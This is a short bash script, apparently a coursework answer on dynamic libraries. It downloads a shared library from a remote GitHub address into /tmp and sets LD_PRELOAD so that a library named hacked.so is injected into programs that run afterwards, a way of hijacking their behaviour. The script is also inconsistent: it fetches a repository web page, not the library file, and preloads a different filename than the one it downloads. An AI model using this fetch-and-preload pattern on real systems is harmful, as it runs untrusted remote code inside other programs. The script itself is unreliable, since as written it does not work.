#!/bin/bash
wget -P /tmp https://github.com/aminuv/alx-low_level_programming/tree/master/0x18-dynamic_libraries/libshared.so
export LD_PRELOAD=/tmp/hacked.so
